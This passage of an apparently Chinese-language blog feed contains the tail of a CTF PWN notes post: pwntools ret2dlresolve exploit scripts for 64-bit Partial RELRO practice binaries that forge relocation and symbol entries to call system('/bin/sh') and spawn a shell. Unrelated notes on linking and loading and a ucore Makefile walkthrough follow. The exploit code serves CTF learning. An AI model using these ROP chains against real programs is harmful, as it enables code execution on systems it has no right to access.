class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br>rop.raw(sh)<br>read_plt = <span class="hljs-number">0x401066</span>  <span class="hljs-comment"># seconde instruction of read@plt</span><br>rop.raw(read_plt)<br><span class="hljs-comment"># log.error(f&#x27;len of rop: &#123;len(rop.chain())&#125;&#x27;) </span><br><br>gdb.attach(p)<br><span class="hljs-comment"># sleep(0.5)</span><br>ss(rop.chain())<br>ss(pack(base + <span class="hljs-number">240</span>))<br>itt()<br></code></pre></div></td></tr></table></figure><h4 id="64-Partial-RELRO"><a href="#64-Partial-RELRO" class="headerlink" title="64, Partial RELRO"></a>64, Partial RELRO</h4><p>64位下各个结构体的不同在背景知识里有提到. </p><p>很明显的一个问题是64位下栈空间的使用大大增加, 好在一个page的bss段还是够用的. </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-built_in">bin</span> = <span class="hljs-string">&#x27;./partial_relro_64&#x27;</span><br>context.binary = elf = ELF(<span class="hljs-built_in">bin</span>)<br>context.log_level = <span class="hljs-string">&#x27;DEBUG&#x27;</span><br>p = process(<span class="hljs-built_in">bin</span>)<br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv a</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br><br>csu_front = <span class="hljs-number">0x401298</span><br>csu_end = <span class="hljs-number">0x4012b2</span><br><span class="hljs-comment"># will take place 0x38+0x38+0x8=0x78 or 120 bytes space</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">csu_call</span>(<span class="hljs-params">pointer, edi=<span class="hljs-number">0</span>, rsi=<span class="hljs-number">0</span>, rdx=<span class="hljs-number">0</span>, rsp=<span class="hljs-number">0</span>, fir_arg=<span class="hljs-number">0</span>, sec_arg=<span class="hljs-number">0</span></span>):</span><br>    <span class="hljs-comment"># rdi = edi = r12d</span><br>    <span class="hljs-comment"># rsi = r13</span><br>    <span class="hljs-comment"># rdx = r14</span><br>    <span class="hljs-comment"># rbx = 0, rbp = 1</span><br>    <span class="hljs-comment"># pop sequence: rbx rbp r12 r13 r14 r15</span><br>    payload = pack(csu_end)<br>    payload += flat([<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, edi, rsi, rdx, pointer, csu_front])<br>    <span class="hljs-keyword">if</span> rsp != <span class="hljs-number">0</span>:<br>        payload += flat([<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>, rsp-<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x38</span>-<span class="hljs-number">0x10</span>-<span class="hljs-number">0x8</span>)])<br>    <span class="hljs-keyword">else</span>:<br>        payload += flat([fir_arg, sec_arg, <span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x38</span>-<span class="hljs-number">0x10</span>)])<br>    <span class="hljs-keyword">return</span> payload<br><br>bss = elf.get_section_by_name(<span class="hljs-string">&#x27;.bss&#x27;</span>).header.sh_addr<br>rel_plt = elf.get_section_by_name(<span class="hljs-string">&#x27;.rela.plt&#x27;</span>).header.sh_addr<br>dynsym = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynsym&#x27;</span>).header.sh_addr<br>dynstr = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynstr&#x27;</span>).header.sh_addr<br>plt = elf.get_section_by_name(<span class="hljs-string">&#x27;.plt&#x27;</span>).header.sh_addr<br><br>stack_size = <span class="hljs-number">0x400</span> + <span class="hljs-number">0x18</span>*<span class="hljs-number">110</span> -<span class="hljs-number">8</span><br>base = bss + stack_size<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>log.success(<span class="hljs-string">&#x27;base = 0x%x&#x27;</span> % base)<br><br>rop = ROP(<span class="hljs-built_in">bin</span>)<br>rop.raw(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">120</span>)<br>rop.raw(csu_call(read_got, <span class="hljs-number">0</span>, base, <span class="hljs-number">120</span>, rsp=base))<br>rop.raw(rop.leave.address)<br>rop.raw(<span class="hljs-string">&#x27;b&#x27;</span> * (<span class="hljs-number">256</span> - <span class="hljs-built_in">len</span>(rop.chain())))<br>log.success(<span class="hljs-string">f&#x27;migrate rop len: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(rop.chain())&#125;</span>&#x27;</span>)<br><span class="hljs-comment"># gdb.attach(p)</span><br>ss(rop.chain())<br><br>binsh_addr = base + <span class="hljs-number">72</span> + <span class="hljs-number">8</span><br>binsh = <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br>rel_idx = <span class="hljs-built_in">int</span>((base + <span class="hljs-number">48</span> - rel_plt) / <span class="hljs-number">0x18</span>)<br>pop_rdi = <span class="hljs-number">0x4012bb</span><br>rop = ROP(<span class="hljs-built_in">bin</span>)<br>rop.raw(pop_rdi)<br>rop.raw(binsh_addr)<br>rop.raw(plt)<br><br>rop.raw(rel_idx)<br>rop.raw(<span class="hljs-number">0</span>)      <span class="hljs-comment"># system_ret_addr</span><br>rop.raw(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br><span class="hljs-comment"># len is 48</span><br><br>fake_rel_addr = base + <span class="hljs-number">48</span><br><span class="hljs-comment"># log.success(hex(fake_rel_addr))</span><br><span class="hljs-comment"># fake_rel_addr += 0x18 - (fake_rel_addr - rel_plt) % 0x18    # add 0x8 bytes</span><br><span class="hljs-comment"># log.success(hex(fake_rel_addr))</span><br>fake_sym_addr = base + <span class="hljs-number">96</span><br><span class="hljs-comment"># fake_sym_addr += 0x18 - (fake_sym_addr - dynsym) % 0x18</span><br><span class="hljs-comment"># log.error(str(fake_rel_addr-rel_plt)+&#x27; &#x27;+str(fake_sym_addr-dynsym))</span><br><span class="hljs-comment"># log.error(str(fake_sym_addr-base)) # 96</span><br><br>r_offset = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_sym_idx = (fake_sym_addr - dynsym) / <span class="hljs-number">0x18</span><br>r_info = (<span class="hljs-built_in">int</span>(write_sym_idx) &lt;&lt; <span class="hljs-number">32</span>) | <span class="hljs-number">0x7</span><br>fake_write_rel = flat([r_offset, r_info, <span class="hljs-number">0</span>]) <span class="hljs-comment"># last is addend</span><br>rop.raw(fake_write_rel) <span class="hljs-comment"># len is 72</span><br><span class="hljs-comment"># log.error(str(len(rop.chain())))</span><br>rop.raw(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>rop.raw(binsh)<br>rop.raw(<span class="hljs-string">&#x27;system\x00&#x27;</span>)<br><br>rop.raw(<span class="hljs-string">&#x27;c&#x27;</span>*(<span class="hljs-number">96</span>-<span class="hljs-built_in">len</span>(rop.chain())))<br>st_name = (base + <span class="hljs-number">72</span> + <span class="hljs-number">16</span>) - dynstr<br>fake_write_sym = p32(st_name) + p16(<span class="hljs-number">0x12</span>) + p16(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>rop.raw(fake_write_sym)<br><span class="hljs-comment"># log.error(str(len(rop.chain()))) # 120</span><br><br>gdb.attach(p)<br>ss(rop.chain())<br>itt()<br></code></pre></div></td></tr></table></figure><h2 id="QEMU逃逸"><a href="#QEMU逃逸" class="headerlink" title="QEMU逃逸"></a>QEMU逃逸</h2><ul><li><p>PCI是个啥</p><p><img src="../../image/CTF_supplement/pci-system.gif" alt="img"></p><ul><li><a href="https://developer.aliyun.com/article/559546">linux中pci设备知识-阿里云开发者社区</a> | <a href="http://www.embeddedlinux.org.cn/linuxkernel/tlk.html">The Linux Kernel - PCI</a> : 不太全, 没看懂. </li><li></li></ul></li></ul><h2 id="经验汇总"><a href="#经验汇总" class="headerlink" title="经验汇总"></a>经验汇总</h2><ul><li>被deque卡住. 看了STL之后熟悉了很多. 下次遇到set mutiset hashmap又得卡. 算了到时候再说. </li><li>以后可以先看看<code>.init_array</code>段中出现的构造函数, 看看有没有用的全局变量提示. 就如这里的<code>unkn_string_arr</code>. </li><li><strong>动静态相结合</strong>可以更快的看出代码的意图. 就比如最重要执行的代码区域的样子, 前面229字节然后一堆call指令, 直接观察call什么地址. </li><li>发现一条路径能够通过修改指针指向的位置, 那就去想能否改变指针从而达到任意写? </li><li>多注意malloc和free函数, delMaind分析就写几个字怎么能反应得到呢.</li><li>常见漏洞:<ul><li>整数溢出, 有符号的比较</li><li>heap利用. 就很多了. 多注意malloc和free</li><li>kernel主要还是逻辑漏洞. </li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《程序员的自我修养-链接装载与库》</title>
    <link href="/2022-05/Archive-%E9%93%BE%E6%8E%A5%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/"/>
    <url>/2022-05/Archive-%E9%93%BE%E6%8E%A5%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<h2 id="1-2"><a href="#1-2" class="headerlink" title="1-2"></a>1-2</h2><p>没啥特别的</p><h2 id="3-ELF"><a href="#3-ELF" class="headerlink" title="3 ELF"></a>3 ELF</h2><blockquote><p>COFF 是由 Unix System V Release 3 首先提出并且使用的格式规范，后来微软公司基 于 COFF 格式，制定了 PE 格式标准，并将其用于当时的 Windows NT 系统。 System V Release 4 在 COFF 的基础上引入了 ELF 格式，目前流行的 Linux 系统也以 ELF 作 为基本可执行文件格式。这也就是为什么目前 PE 和 ELF 如此相似的主要原因</p></blockquote><p>段 section：</p><ul><li>另外值得一提的是，有时候编译器会把宁符串常量放到 “.data” 段，而不会单独放在”.rodata” 段。</li><li>” .note.GNU-stack” 段虽然有 “ CONTENTS”, 但它的长度为 0, 这是个很古怪的段</li><li>应用程序也可以使用一些非系统保留的名字作为段名 。 比如我们可以在 ELF 文件中插入一个 “music” 的 段，里面存放了一首 MP3 音乐，节 ELF 文件运行起来以后可以读取这个段播放这首 MP3. 但是应用程序自定义的段名不能使用“.”作为前缀，否则容易跟系统保留段名冲突。</li><li>比如一个 ELF 文件中可能有两个或两个以上叫做 “.text” 的段</li><li>自定义段<ul><li><code>_attribute_( (section( &quot;FOO&quot;))) int global= 42;</code> </li></ul></li></ul><p>ELF:</p><ul><li>ELF 段表的这个数组的第一个元素是无效的段描述符，它的类型为 ‘,NULL”, 除此之外每个段 描述符都对应一个段</li><li>主要决定段的属性的是段的类型 (<strong>sb_type</strong>) 和段的标志位 (<strong>sh_flags</strong>) P100</li><li>对于变量和函数来说，符号值就是它们的地址</li><li>P108 符号表详细介绍<ul><li>链接器特殊符号! 用extern声明. 在ucore中也见过.</li></ul></li></ul><p>编译器行为:</p><ul><li>符号修饰与函数签名, 加不加下划线的区别.<ul><li>P111 C++函数签名.</li><li>binutils中<code>c++filt</code>命令解析函数签名, 真行</li><li>extern “C”的作用!</li><li>确实是涨知识.</li></ul></li><li>强弱引用:<ul><li>通过使用 <code>&quot;_attribute_((weakref))&quot; </code>这个扩展关键字来声明对一 个外部函数的引用为弱引用</li><li>这种弱符号和弱引用对于库来说十分有用，比如库中定义的弱符号可以被用户定义的强 符号所覆盖，从而使得程序可以使用自定义版本的库函数；或者程序可以对某些扩展功能模块的引用定义为弱引用，当我们将扩展模块与程序链接在一起时，功能模块就可以正常使用； 如果我们去掉了某些功能模块，那么程序也可以正常链接，只是缺少了相应的功能，这使得程序的功能更加容易裁剪和组合。</li></ul></li><li><strong>DWARF</strong> ( Debug With Arbitrary Record Format)</li></ul><h2 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h2><p>对于多个输入目标文件，链接器将相似段合并</p><p>整个链接过程分两步:</p><ul><li>扫描所有的输入目标文件，并且获得它们的各个段的长度、 属性和位置，并且将输入目标文件中的符号表中所有的符号定义和符号引用收集起来，统— 放到一个全局符号表。</li><li>使用上面第一步中收集到的所有信息，读取输入文件中段的数据、重定位信息，井且进行符号解析与重定位、调整代码中的地址等</li></ul><p>也就是:</p><ul><li>链接器按照前面介绍的空间分配方法进行分配，这时候输入文 件中的各个段在链接后的<strong>虚拟地址</strong>就已经确定了</li><li>当前面一步完成之后，链接器开始计算各个符号的虚拟地址</li></ul><p>我现在的知识似乎还停留在静态链接的框架里面. 还是继续看吧, 书里也有动态链接的细节. 在CSAPP里也没提及.</p><p><strong>4.3 COMMON 块</strong> </p><ul><li>COMMON 类型的链接规则是针对符号都是弱符号的情况， 如果其中有一个符号 为强符号，那么最终输出结果中的符号所占空间与强符号相同, 如果有弱符号的大小大于强符号的大小, 那么连接器会给出警告.</li><li>直接导致需要COMMON 机制的原因是编译器和链接器允许不同类型的弱符号存在，但最本质的原因还是 链接器不支持符号类型，即链接器无法判断各个符号的类型是否一致。</li><li>编译器在链接前无法为弱符号在BSS 段分配空间，因为所须要空间的大小未知。如果只使用<code>gcc -c</code>的话会发现未初始化的全局变量没有出现在bss段. 但是链接器在链接过程中可以确定弱符号的大小.</li><li><code>-fno-common</code> or <code>__attribute__((nocommon));</code> 禁用common处理.</li><li>一旦一个未初始化的全局变蜇不是以 COMMON 块的形式存在，那么它就相当于一个强符号，如果其他目标文件中还有同一个变量的强符号定义，链接时就会发生符号重复定义错误。</li></ul><p><strong>4.4 C+＋相关问题</strong> P135</p><p><strong>4.4.2 全局构造与析构</strong> </p><ul><li>Linux 系统下一般程序的入口是 “_start”. 这个函数是 Linux 系统库 (Glibc) 的一部分</li><li>利用<code>.init和.fini段</code>的特性， C++的全局构造和析构函数就由此实现</li></ul><p><strong>4.4.3 C+＋与 ABI</strong>  </p><ul><li>其中我们把符号修饰 标准、变量内存布局、函数调用方式等这些跟可执行代码二进制兼容性相关的内容称为 ABI (Application Binary Interface).</li><li>影响ABI的因素. P139</li></ul><p>静态库链接:</p><ul><li>VIsual C+＋也提供了与 Lmux下的ar类似的工具，叫lib.exe，这个程序可以用来创建,提取,列举lib文件中的内容。</li><li>P143 链接的一个示例过程</li></ul><p>4.6.2 最“小＂的程序</p><blockquote><p>做着做着就做到思维导图上去了…</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ucore makefile分析</title>
    <link href="/2022-04/Archive-ucore-makefile/"/>
    <url>/2022-04/Archive-ucore-makefile/</url>
    
    <content type="html"><![CDATA[<p>贴个出处: -&gt; <a href="https://www.jianshu.com/p/2f95d38afa1d">link</a> </p><p>不妨对整个lab1所提供的Makefile进行解释如下：</p><p>不妨首先考虑Makefile中生成ucore.img相关的主要代码(暂时不考虑细节问题)来描述生成出ucore.img的每一个具体步骤:</p><ul><li><p>生成kernel:</p><ul><li>首先是<code>$(call add_files_cc,$(call listf_cc,$(LIBDIR)),libs,)</code>这一段代码，含义是寻找libs目录下的所有具有.c, .s后缀的文件，并生成相应的.o文件，放置在obj/libs/文件夹下，具体生成的文件是printfmt.o, string.o文件，与此同时，该文件夹下还生成了.d文件，这是Makefile自动生成的依赖文件列表所存放的位置，比如打开string.d文件可以发现，string.o文件的生成依赖于string.c, string.h, x86.h, defs.h四个文件，这与我们对于代码的观察是一致的；这部分编译所使用的编译选项保存在CFLAGS变量下，关于具体每一个使用到的gcc编译选项的含义，将在下文具体分析Makefile中定义CFLAGS变量的部分进行详细描述；</li><li><code>$(call add_files_cc,$(call listf_cc,$(KSRCDIR)),kernel,$(KCFLAGS)</code>这一段代码将用于生成kernel的所有子目录下包含的CTYPE文件（.s, .c文件）所对应的.o文件以及.d文件，这段代码与上述生成obj/libs/*.o文件的代码类似，区别仅在于其还新指定了若干gcc编译选项，存放在KCFLAGS变量中，具体为制定了若干存放在KINCLUDE变量下的头文件；具体而言，该命令最终生成的文件为obj/kern下子目录里的以stdio, readline, panic, kdebug, kmonitor, clock, console, picirq, intr, trap, vector, trapentry, pmm为前缀的.d, .o文件；</li><li>接下来<code>$(kernel): tools/kernel.ld</code>表示/bin/kernel文件依赖于tools/kernel.ld文件，并且没有指定生成规则，也就是说如果没有预先准备好kernel.ld，就会在make的时候产生错误；之后的<code>$(kernel): $(KOBJS)</code>表示kernel文件的生成还依赖于上述生成的obj/libs, obj/kernels下的.o文件，并且生成规则为使用ld链接器将这些.o文件连接成kernel文件，其中ld的-T表示指定使用kernel.ld来替代默认的链接器脚本；关于LDFLAGS中的选项含义，将在下文中描述LDFLAGS变量定义的时候进行描述；之后还使用objdump反汇编出kernel的汇编代码，-S表示将源代码与汇编代码混合展示出来，这部分代码最终保存在kernel.asm文件中；-t表示打印出文件的符号表表项，然后通过管道将带有符号表的反汇编结果作为sed命令的标准输入进行处理，最终将符号表信息保存到kernel.sym文件中；</li></ul></li><li><p>生成bootblock文件：</p><ul><li><p>首先是</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">foreach</span> f,<span class="hljs-variable">$(bootfiles)</span>,$(<span class="hljs-built_in">call</span> cc_compile,<span class="hljs-variable">$(f)</span>,<span class="hljs-variable">$(CC)</span>,<span class="hljs-variable">$(CFLAGS)</span> -Os -nostdinc)</span><br></code></pre></div></td></tr></table></figure><p>这一段代码，表示将boot/文件夹下的bootasm.S, bootmain.c两个文件编译成相应的.o文件，并且生成依赖文件.d；其中涉及到的两个gcc编译选项含义如下所示：</p><ul><li>-nostdinc: 不搜索默认路径头文件；</li><li>-0s: 针对生成代码的大小进行优化，这是因为bootloader的总大小被限制为不大于512-2=510字节；</li></ul></li><li><p>接下来由代码</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-variable">$(bootblock)</span>: <span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,<span class="hljs-variable">$(bootfiles)</span>)</span> | <span class="hljs-variable">$(<span class="hljs-built_in">call</span> totarget,sign)</span><br></code></pre></div></td></tr></table></figure><p>可知，bootblock依赖于bootasm.o, bootmain.o文件与sign文件，其中两个.o文件由以下规则生成：</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-variable">$(V)</span><span class="hljs-variable">$(LD)</span> <span class="hljs-variable">$(LDFLAGS)</span> -N -e start -Ttext 0x7C00 <span class="hljs-variable">$^</span> -o <span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,bootblock)</span><br></code></pre></div></td></tr></table></figure><p>: 使用ld链接器将依赖的.o文件链接成bootblock.o文件，该文件中除了$(LDFLAGS)之外的其他选项含义如下：</p><ul><li>-N：将代码段和数据段设置为可读可写；</li><li>-e：设置入口；</li><li>-Ttext：设置起始地址为0X7C00；</li></ul></li><li><p><code>@$(OBJDUMP) -S $(call objfile,bootblock) &gt; $(call asmfile,bootblock)</code>: 使用objdump将编译结果反汇编出来，保存在bootclock.asm中，-S表示将源代码与汇编代码混合表示；</p></li><li><p><code>@$(OBJCOPY) -S -O binary $(call objfile,bootblock) $(call outfile,bootblock)</code>: 使用objcopy将bootblock.o二进制拷贝到bootblock.out，其中：</p><ul><li>-S：表示移除符号和重定位信息；</li><li>-O：表示指定输出格式；</li></ul></li><li><p><code>@$(call totarget,sign) $(call outfile,bootblock) $(bootblock)</code>: 使用sign程序, 利用bootblock.out生成bootblock;</p></li><li><p><code>$(call add_files_host,tools/sign.c,sign,sign</code>: 利用tools/sing.c生成sign.o, <code>$(call create_target_host,sign,sign)</code>则利用sign.o生成sign，至此bootblock所依赖的文件均生成完毕；</p></li></ul></li><li><p>最后一个部分是利用dd命令使用bootblock, kernel文件来生成ucore.img文件：</p><ul><li><code>$(V)dd if=/dev/zero of=$@ count=10000</code> 命令表示从/dev/zero文件中获取10000个block，每一个block为512字节，并且均为空字符，并且输出到目标文件ucore.img中；</li><li><code>$(V)dd if=$(bootblock) of=$@ conv=notrunc</code> 命令表示从bootblock文件中获取数据，并且输出到目标文件ucore.img中，-notruct选项表示不要对数据进行删减；</li><li><code>$(V)dd if=$(kernel) of=$@ seek=1 conv=notrunc</code> 命令表示从kernel文件中获取数据，并且输出到目标文件ucore.img中, 并且seek = 1表示跳过第一个block，输出到第二个块；</li></ul></li><li><p>至此，关于生成ucore.img文件的主要的Makefile命令分析完成；</p></li><li><p>接下来将就整个Makefile文件中的其他每个部分进行分析:首先在Makefile的最开始是对各种常量的初始化：</p></li></ul><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go">PROJ    := challenge<br>EMPTY   :=<br>SPACE   := $(EMPTY) $(EMPTY)<br>SLASH   := /<br><br>V       :=<br></code></pre></div></td></tr></table></figure><ul><li>接下来部分则用于推断环境中调用所安装的gcc应当使用的命令：<br> 在本部分，如果为定义GCCPREFIX变量，则利用了linux bash中的技巧来推断所使用的gcc命令是什么, 在本部分首先猜测gcc命令的前缀是i386-elf-，因此执行i386-elf-objdump -i命令，2&gt;&amp;1表示将错误输出一起输出到标准输出里，然后通过管道的方式传递给下一条bash命令grep ‘^elf32-i386$$’ &gt;/dev/null 2&gt;&1;，&gt;/dev/null这部分表示将标准输出输出到一个空设备里，而输入上一条命令发送给grep的标准输出（作为grep的输入）中可以匹配到’^elf32-i386$$’的话，则说明i386-elf-objdump这一命令是存在的，那么条件满足，由echo输出’i386-elf-‘，由于是在$()里的bash命令，这个输出会作为值被赋给GCCPREFIX变量；如果i386-elf-objdump命令不存在，则猜测使用的gcc命令不包含其他前缀，则继续按照上述方法，测试objdump这条命令是否存在，如果存在则GCCPREFIX为空串，否则之间报错，要求显示地提供gcc的前缀作为GCCPREFIX变量的数值（可以在环境变量中指定）；</li></ul><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ifndef GCCPREFIX<br>GCCPREFIX := $(shell <span class="hljs-keyword">if</span> i386-elf-objdump -i 2&gt;&amp;1 | grep <span class="hljs-string">&#x27;^elf32-i386$$&#x27;</span> &gt;/dev/null 2&gt;&amp;1; \<br>    <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;i386-elf-&#x27;</span>; \<br>    <span class="hljs-keyword">elif</span> objdump -i 2&gt;&amp;1 | grep <span class="hljs-string">&#x27;elf32-i386&#x27;</span> &gt;/dev/null 2&gt;&amp;1; \<br>    <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&#x27;</span>; \<br>    <span class="hljs-keyword">else</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;***&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*** Error: Couldn&#x27;t find an i386-elf version of GCC/binutils.&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*** Is the directory with i386-elf-gcc in your PATH?&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*** If your i386-elf toolchain is installed with a command&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*** prefix other than &#x27;i386-elf-&#x27;, set your GCCPREFIX&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*** environment variable to that prefix and run &#x27;make&#x27; again.&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*** To turn off this error, run &#x27;gmake GCCPREFIX= ...&#x27;.&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;***&quot;</span> 1&gt;&amp;2; <span class="hljs-built_in">exit</span> 1; <span class="hljs-keyword">fi</span>)<br>endi<br></code></pre></div></td></tr></table></figure><ul><li>接下来部分与上述方法一致，利用bash命令来推断qemu的命令，因此具体细节不再赘述；</li></ul><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># try to infer the correct QEMU</span><br>ifndef QEMU<br>QEMU := $(shell <span class="hljs-keyword">if</span> <span class="hljs-built_in">which</span> qemu-system-i386 &gt; /dev/null; \<br>    <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;qemu-system-i386&#x27;</span>; <span class="hljs-built_in">exit</span>; \<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">which</span> i386-elf-qemu &gt; /dev/null; \<br>    <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;i386-elf-qemu&#x27;</span>; <span class="hljs-built_in">exit</span>; \<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">which</span> qemu &gt; /dev/null; \<br>    <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;qemu&#x27;</span>; <span class="hljs-built_in">exit</span>; \<br>    <span class="hljs-keyword">else</span> \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;***&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*** Error: Couldn&#x27;t find a working QEMU executable.&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*** Is the directory containing the qemu binary in your PATH&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;***&quot;</span> 1&gt;&amp;2; <span class="hljs-built_in">exit</span> 1; <span 